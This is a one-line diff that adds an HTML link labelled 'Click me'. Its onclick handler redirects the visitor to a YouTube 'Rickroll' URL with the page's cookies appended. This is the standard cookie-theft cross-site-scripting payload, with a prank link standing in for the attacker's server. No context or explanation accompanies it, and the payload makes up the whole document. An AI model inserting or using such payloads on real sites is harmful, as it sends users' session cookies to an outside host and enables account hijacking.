@@ -1,0 +1,1 @@
+<a href="#" onclick="document.location='https://youtu.be/dQw4w9WgXcQ' +escape(document.cookie);" target=_blank>Click me</a> 
